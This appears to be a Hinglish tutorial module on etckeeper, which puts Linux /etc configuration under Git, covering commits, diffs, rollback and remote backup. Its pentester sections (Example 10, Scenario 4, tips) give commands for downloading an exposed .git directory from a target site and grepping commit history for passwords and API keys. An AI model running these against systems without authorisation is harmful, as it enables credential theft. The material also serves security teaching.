# **Module 10: Backup, Restore & Version Control (Part 2)** ğŸ’¾ğŸ”„

---

## **Topic 2: Configuration Versioning with etckeeper** ğŸ“ğŸ”§

---

### **1ï¸âƒ£ Topic Summary (1-2 lines)**

etckeeper `/etc/` directory ko Git repository mein convert kar deta hai - har configuration change automatically track hota hai with full version history aur rollback capability.

---

### **2ï¸âƒ£ Detailed Explanation with Analogy** ğŸ§ 

**Kya hai etckeeper?**

etckeeper ek tool hai jo `/etc/` directory (jahan Linux ke saare configuration files hote hain) ko Git version control system ke under rakhta hai. Har baar jab aap koi package install/remove karte ho ya manually config file edit karte ho, etckeeper automatically commit kar deta hai.

**etckeeper Features:**

1. **Automatic Commits** - Package install/update par auto-commit
2. **Git Integration** - Full Git power (diff, log, revert)
3. **Permission Tracking** - File permissions bhi track hote hain
4. **Daily Auto-commits** - Cron job se daily changes commit
5. **Pre/Post Hooks** - APT/YUM operations ke saath integrate

**Analogy:**

etckeeper ek **time-traveling notebook** ki tarah hai. Jaise aap notebook mein har din ka kaam likhte ho aur kisi bhi purane page par wapas ja sakte ho, waise hi etckeeper har config change record karta hai. "2 mahine pehle nginx config kaisa tha?" - ek command se dekh sakte ho!

---

### **3ï¸âƒ£ Why is this Important?** ğŸ¯

**Sysadmin Perspective:**
- Configuration changes ka complete history
- "Who changed what when" track karna
- Broken config ko previous version se restore karna
- Multiple servers ka config compare karna
- Audit trail for compliance
- Team collaboration (multiple admins)

**Pentester Perspective:**
- Git history mein old vulnerable configs
- Commit messages se admin activity pattern
- Old commits mein hardcoded credentials
- `.git` directory exposed = full config history
- Commit author information (admin usernames)
- Timing analysis of configuration changes

---

### **4ï¸âƒ£ Real-World Use Cases** ğŸ’¼

**Admin Use Cases:**
1. Track nginx/apache config changes over time
2. Rollback broken SSH config
3. Compare configs between servers
4. Audit who changed firewall rules
5. Document configuration evolution

**Pentester Use Cases:**
1. Exposed `.git` directory exploit karna
2. Old commits mein credentials search karna
3. Configuration history analyze karna
4. Admin usernames from commit authors
5. Vulnerable old configs identify karna

---

### **5ï¸âƒ£ Consequences of Not Knowing** âš ï¸

**Admin Problems:**
- âŒ Config changes ka koi record nahi
- âŒ "Kisne ye change kiya?" - pata nahi chalega
- âŒ Broken config restore karna mushkil
- âŒ Audit trail missing
- âŒ Team collaboration difficult

**Pentester Problems:**
- âŒ Configuration history miss karna
- âŒ Exposed Git repos overlook karna
- âŒ Old credentials miss karna
- âŒ Admin activity patterns miss karna
- âŒ Easy wins overlook karna

---

### **6ï¸âƒ£ Syntax & Command Structure** ğŸ“

#### **etckeeper Installation:**
```bash
# Ubuntu/Debian
sudo apt install etckeeper git

# Fedora/RHEL
sudo dnf install etckeeper git

# Arch Linux
sudo pacman -S etckeeper git
```

#### **etckeeper Commands:**
```bash
etckeeper init           # Initialize /etc as Git repo
etckeeper commit "msg"   # Manual commit with message
etckeeper vcs log        # View commit history
etckeeper vcs diff       # Show uncommitted changes
etckeeper vcs status     # Check repository status
```

#### **Git Commands (in /etc/):**
```bash
cd /etc
sudo git log             # View history
sudo git diff            # Show changes
sudo git show COMMIT     # View specific commit
sudo git revert COMMIT   # Revert specific commit
```

---

### **7ï¸âƒ£ Detailed Examples with Explanation Tables** ğŸ’»

#### **Example 1: Install and Initialize etckeeper**

```bash
sudo apt install etckeeper git -y
sudo etckeeper init
```

| Part | Explanation |
|------|-------------|
| `apt install etckeeper git` | Install etckeeper and Git |
| `etckeeper init` | Initialize /etc as Git repository |

**Output:**
```
Initialized empty Git repository in /etc/.git/
[master (root-commit) a1b2c3d] Initial commit
 1234 files changed, 56789 insertions(+)
```

---

#### **Example 2: View Configuration History**

```bash
cd /etc
sudo git log --oneline
```

**Output:**
```
d4e5f6g (HEAD -> master) daily autocommit
c3d4e5f committing changes in /etc after apt run
b2c3d4e Initial commit
```

---

#### **Example 3: Check What Changed**

```bash
# Edit a config file
sudo nano /etc/ssh/sshd_config
# Change: PermitRootLogin no

# Check changes
sudo etckeeper vcs diff
```

**Output:**
```diff
diff --git a/ssh/sshd_config b/ssh/sshd_config
index 1234567..abcdefg 100644
--- a/ssh/sshd_config
+++ b/ssh/sshd_config
@@ -32,7 +32,7 @@
 # Authentication:
 
 #LoginGraceTime 2m
-PermitRootLogin yes
+PermitRootLogin no
 #StrictModes yes
```

---

#### **Example 4: Commit Configuration Changes**

```bash
sudo etckeeper commit "Disabled root SSH login for security"
```

| Part | Explanation |
|------|-------------|
| `etckeeper commit` | Commit changes to Git |
| `"message"` | Descriptive commit message |

**Output:**
```
[master e5f6g7h] Disabled root SSH login for security
 1 file changed, 1 insertion(+), 1 deletion(-)
```

---

#### **Example 5: View Specific File History**

```bash
cd /etc
sudo git log --follow ssh/sshd_config
```

**Output:**
```
commit e5f6g7h
Author: root <root@server>
Date:   Mon Jan 15 14:30:00 2024 +0000

    Disabled root SSH login for security

commit c3d4e5f
Author: root <root@server>
Date:   Sun Jan 14 10:00:00 2024 +0000

    Initial SSH configuration
```

---

#### **Example 6: Compare File Versions**

```bash
# Compare current vs 2 commits ago
cd /etc
sudo git diff HEAD~2 ssh/sshd_config
```

**Output:** Shows all changes made in last 2 commits.

---

#### **Example 7: Restore Old Configuration**

```bash
# View old version
cd /etc
sudo git show HEAD~3:ssh/sshd_config

# Restore old version
sudo git checkout HEAD~3 -- ssh/sshd_config

# Commit the restoration
sudo etckeeper commit "Restored old SSH config"

# Restart service
sudo systemctl restart sshd
```

---

#### **Example 8: Automatic Commits on Package Install**

```bash
# Install package
sudo apt install nginx

# etckeeper automatically commits
cd /etc
sudo git log --oneline -1
```

**Output:**
```
f6g7h8i committing changes in /etc after apt run
```

**Files changed:** nginx config files automatically tracked!

---

#### **Example 9: Daily Auto-commit Check**

```bash
# etckeeper has daily cron job
cat /etc/cron.daily/etckeeper
```

**Output:**
```bash
#!/bin/sh
set -e
if [ -x /usr/bin/etckeeper ] && [ -e /etc/etckeeper/etckeeper.conf ]; then
    /usr/bin/etckeeper commit "daily autocommit" >/dev/null
fi
```

---

#### **Example 10: Pentester - Exploit Exposed Git Repo**

```bash
# Check if /etc/.git exposed (web server misconfiguration)
curl http://target.com/.git/config

# If accessible, download entire repo
wget -r http://target.com/.git/

# Reconstruct repository
cd target.com
git checkout -- .

# Analyze history for credentials
git log --all --full-history -- "*password*"
git log --all --full-history -- "*secret*"

# Search all commits
git rev-list --all | while read commit; do
    git grep -i "password" $commit
done
```

---

### **8ï¸âƒ£ Common Mistakes & How to Avoid** âŒâ¡ï¸âœ…

| Mistake | Problem | Solution |
|---------|---------|----------|
| Not committing manual changes | Changes not tracked | Always `etckeeper commit` after manual edits |
| Poor commit messages | Can't understand history | Use descriptive messages |
| Forgetting to restart services | Config changed but not applied | Always restart after restore |
| Exposing /etc/.git on web | Security risk | Never serve /etc via web server |
| Not setting Git user | Commits show wrong author | Configure Git user/email |
| Large binary files in /etc | Repo size bloat | Add to .gitignore |
| Reverting without testing | Broken config | Test in staging first |
| No remote backup | Single point of failure | Push to remote Git server |

---

### **9ï¸âƒ£ Best Practices & Pro Tips** â­

**Admin Best Practices:**
1. âœ… **Descriptive Commits**: "Changed nginx timeout from 30s to 60s"
2. âœ… **Commit Before Changes**: `etckeeper commit` before major edits
3. âœ… **Remote Backup**: Push /etc to private Git server
4. âœ… **Review Changes**: `etckeeper vcs diff` before committing
5. âœ… **Configure Git User**: Set proper author information
6. âœ… **Regular Checks**: Weekly `git log` review
7. âœ… **Document**: Add README in /etc explaining setup
8. âœ… **Test Restores**: Practice restoring configs

**Pentester Pro Tips:**
1. ğŸ” **Check for .git**: `curl http://target/.git/config`
2. ğŸ” **Download Git Repos**: Use git-dumper, GitHack tools
3. ğŸ” **Search History**: `git log --all --grep="password"`
4. ğŸ” **Analyze Commits**: Look for credentials, API keys
5. ğŸ” **Check Authors**: Admin usernames in commits
6. ğŸ” **Timing Analysis**: Commit patterns reveal admin schedules
7. ğŸ” **Old Vulnerabilities**: Check old configs for weak settings
8. ğŸ” **Sensitive Files**: Search for private keys, certificates

---

### **ğŸ”Ÿ Real-World Scenarios** ğŸŒ

#### **Scenario 1: Track and Rollback Broken Config (Admin)**

**Situation:** Nginx config edit kiya, ab website down hai.

**Solution:**
```bash
# Check what changed
cd /etc
sudo git diff nginx/nginx.conf

# View recent commits
sudo git log --oneline -5

# Restore previous version
sudo git checkout HEAD~1 -- nginx/nginx.conf

# Test config
sudo nginx -t

# If OK, restart
sudo systemctl restart nginx

# Commit the rollback
sudo etckeeper commit "Rolled back broken nginx config"
```

**Result:** Website 2 minutes mein wapas online!

---

#### **Scenario 2: Audit Configuration Changes (Admin)**

**Situation:** Firewall rules change ho gaye, pata karna hai kisne kab kiya.

**Solution:**
```bash
# Check iptables config history
cd /etc
sudo git log --follow iptables/rules.v4

# View specific commit
sudo git show a1b2c3d

# See who made change
sudo git log --format="%an %ae %ad" iptables/rules.v4
```

**Output:**
```
commit a1b2c3d
Author: john <john@company.com>
Date:   Fri Jan 12 15:30:00 2024

    Opened port 8080 for new application

diff --git a/iptables/rules.v4 b/iptables/rules.v4
+++ b/iptables/rules.v4
+-A INPUT -p tcp --dport 8080 -j ACCEPT
```

**Result:** John ne Jan 12 ko port 8080 open kiya tha!

---

#### **Scenario 3: Compare Configs Across Servers (Admin)**

**Situation:** Production aur staging server ka nginx config compare karna hai.

**Solution:**
```bash
# On production server
cd /etc
sudo git show HEAD:nginx/nginx.conf > /tmp/prod_nginx.conf

# Copy to local machine
scp user@prod-server:/tmp/prod_nginx.conf .

# On staging server
cd /etc
sudo git show HEAD:nginx/nginx.conf > /tmp/staging_nginx.conf
scp user@staging-server:/tmp/staging_nginx.conf .

# Compare locally
diff prod_nginx.conf staging_nginx.conf
```

**Result:** Differences clearly visible!

---

#### **Scenario 4: Exposed Git Repository Exploit (Pentester)**

**Situation:** Target website ka /.git/ directory accessible hai.

**Attack:**
```bash
# Check if .git exposed
curl http://target.com/.git/config
# Output: [core] repositoryformatversion = 0

# Download entire repository
git-dumper http://target.com/.git/ target_configs

# Analyze downloaded configs
cd target_configs
git log --all --oneline

# Search for credentials
git log --all --full-history --source --find-copies-harder -- "*password*" "*secret*" "*key*"

# Search in all commits
git rev-list --all | while read commit; do
    echo "=== Commit: $commit ==="
    git show $commit | grep -i "password\|secret\|api_key"
done
```

**Finding:**
```
commit b2c3d4e
+database_password = "SuperSecret123"
+api_key = "sk_live_abc123xyz"
```

**Impact:** Database credentials aur API keys exposed!

---

#### **Scenario 5: Configuration Backup Strategy (Admin)**

**Situation:** Multiple servers ka /etc backup centralized Git server par.

**Solution:**
```bash
# On each server, setup etckeeper
sudo apt install etckeeper git -y
sudo etckeeper init

# Configure Git remote
cd /etc
sudo git remote add origin git@git-server:configs/server1-etc.git

# Initial push
sudo git push -u origin master

# Setup automatic push (daily cron)
sudo nano /etc/cron.daily/etckeeper-push
```

**Script content:**
```bash
#!/bin/bash
cd /etc
git push origin master 2>&1 | logger -t etckeeper-push
```

```bash
sudo chmod +x /etc/cron.daily/etckeeper-push
```

**Result:** Har server ka /etc daily central Git server par backup!

---

### **1ï¸âƒ£1ï¸âƒ£ Checklist for Implementation** âœ…

**Admin Checklist:**
- [ ] etckeeper installed and initialized
- [ ] Git user/email configured
- [ ] Initial commit created
- [ ] Automatic commits on package install working
- [ ] Daily auto-commit cron job active
- [ ] Remote Git repository configured
- [ ] Team members trained on etckeeper
- [ ] Commit message guidelines documented
- [ ] Regular history reviews scheduled
- [ ] Restore procedure tested

**Pentester Checklist:**
- [ ] Check for exposed .git directories
- [ ] Enumerate Git repository if found
- [ ] Download complete repository
- [ ] Analyze commit history
- [ ] Search for credentials in commits
- [ ] Check commit authors (admin usernames)
- [ ] Analyze configuration evolution
- [ ] Look for old vulnerable configs
- [ ] Check for sensitive files (keys, certs)
- [ ] Document findings with PoC

---

### **1ï¸âƒ£2ï¸âƒ£ Frequently Asked Questions (FAQs)** â“

**Q1: etckeeper vs regular backups - kya farak hai?**
**A:** etckeeper version control hai (har change track), backup ek snapshot hai. etckeeper se aap specific file ka specific version restore kar sakte ho with full history.

**Q2: Kya etckeeper automatically commit karta hai?**
**A:** Haan, 3 tareeke se:
- Package install/remove par (APT/YUM hooks)
- Daily cron job (midnight)
- Manual: `etckeeper commit`

**Q3: Kya /etc/.git web server se accessible ho sakta hai?**
**A:** Agar misconfiguration ho toh haan - ye serious security risk hai. Hamesha ensure karein ki .git blocked ho.

**Q4: etckeeper kitni space leta hai?**
**A:** Initial: ~50-100 MB. Incremental: minimal (sirf changes). Git compression efficient hai.

**Q5: Kya multiple admins ke saath kaam kar sakta hai?**
**A:** Haan! Har admin apna Git user/email set kare, phir commits mein author name show hoga.

**Q6: Kaise check karein ki etckeeper kaam kar raha hai?**
**A:**
```bash
cd /etc
sudo git log --oneline -5
# Recent commits dikhne chahiye
```

**Q7: Kya binary files track hote hain?**
**A:** Haan, but Git binary files ke liye efficient nahi hai. Large binaries .gitignore mein add karein.

**Q8: Remote Git server setup kaise karein?**
**A:**
```bash
cd /etc
sudo git remote add origin git@server:repo.git
sudo git push -u origin master
```

---

### **1ï¸âƒ£3ï¸âƒ£ Practice Tasks with Expected Output** ğŸ¯

#### **Task 1: Install and Initialize**
```bash
# Install
sudo apt install etckeeper git -y

# Initialize
sudo etckeeper init

# Check status
cd /etc
sudo git status
```

**Expected Output:**
```
On branch master
nothing to commit, working tree clean
```

---

#### **Task 2: Make and Track Changes**
```bash
# Edit file
sudo nano /etc/hosts
# Add: 192.168.1.100 testserver

# Check changes
sudo etckeeper vcs diff

# Commit
sudo etckeeper commit "Added testserver to hosts"

# Verify
cd /etc
sudo git log --oneline -1
```

**Expected Output:**
```
a1b2c3d Added testserver to hosts
```

---

#### **Task 3: View File History**
```bash
cd /etc
sudo git log --follow hosts
```

**Expected:** List of all commits that modified /etc/hosts.

---

#### **Task 4: Restore Old Version**
```bash
# View old version
cd /etc
sudo git show HEAD~1:hosts

# Restore it
sudo git checkout HEAD~1 -- hosts

# Commit restoration
sudo etckeeper commit "Restored old hosts file"
```

---

### **1ï¸âƒ£4ï¸âƒ£ Advanced Information & Edge Cases** ğŸš€

#### **Advanced Technique 1: Search Entire History**

```bash
# Search for specific string in all commits
cd /etc
sudo git log -S "password" --source --all

# Search with regex
sudo git log -G "password.*=" --source --all

# Show actual content
sudo git log -p -S "password"
```

---

#### **Advanced Technique 2: Blame - Who Changed What**

```bash
# See who changed each line
cd /etc
sudo git blame ssh/sshd_config

# Output shows author and commit for each line
```

---

#### **Advanced Technique 3: Automated Remote Backup**

```bash
# Setup SSH key for passwordless push
sudo ssh-keygen -t ed25519 -f /root/.ssh/etckeeper_key

# Add to Git server's authorized_keys

# Configure Git to use key
cd /etc
sudo git config core.sshCommand "ssh -i /root/.ssh/etckeeper_key"

# Add remote
sudo git remote add backup git@backup-server:etc-backups/$(hostname).git

# Auto-push script
echo '#!/bin/bash
cd /etc
git push backup master 2>&1 | logger -t etckeeper-backup
' | sudo tee /etc/cron.daily/etckeeper-backup

sudo chmod +x /etc/cron.daily/etckeeper-backup
```

---

#### **Edge Case 1: Large Binary Files**

```bash
# Add to .gitignore
cd /etc
echo "ssl/private/*.key" | sudo tee -a .gitignore
sudo etckeeper commit "Ignore large key files"
```

---

#### **Edge Case 2: Merge Conflicts**

```bash
# If pulling from remote causes conflict
cd /etc
sudo git pull origin master
# CONFLICT in ssh/sshd_config

# Resolve manually
sudo nano ssh/sshd_config
# Fix conflicts

# Mark as resolved
sudo git add ssh/sshd_config
sudo git commit -m "Resolved merge conflict"
```

---

### **1ï¸âƒ£5ï¸âƒ£ Final Summary & Key Takeaways** ğŸ“Œ

**Key Concepts:**
1. **etckeeper** - Git-based version control for /etc/
2. **Automatic Commits** - Package operations auto-tracked
3. **Full History** - Every config change recorded
4. **Easy Rollback** - Restore any previous version
5. **Audit Trail** - Who changed what when

**Critical Commands:**
```bash
# Initialize
sudo etckeeper init

# Commit changes
sudo etckeeper commit "message"

# View history
cd /etc && sudo git log

# Show changes
sudo etckeeper vcs diff

# Restore file
sudo git checkout COMMIT -- path/to/file
```

**Admin Takeaways:**
- âœ… Track all /etc/ changes automatically
- âœ… Use descriptive commit messages
- âœ… Review history regularly
- âœ… Setup remote backup
- âœ… Test restore procedures
- âœ… Configure Git user properly
- âœ… Never expose .git directory

**Pentester Takeaways:**
- ğŸ” Always check for exposed .git directories
- ğŸ” Download and analyze Git history
- ğŸ” Search commits for credentials
- ğŸ” Check old configs for vulnerabilities
- ğŸ” Commit authors reveal admin usernames
- ğŸ” Timing patterns reveal admin schedules
- ğŸ” Full configuration history = goldmine

**Remember:**
- etckeeper = version control for configs
- Automatic commits on package operations
- Full Git power available
- Remote backup essential
- Never expose .git publicly

**Next Topic:** File-level Backups (rsync, rsnapshot) ğŸ“

---

**Happy Version Controlling! ğŸ“ğŸ”§**
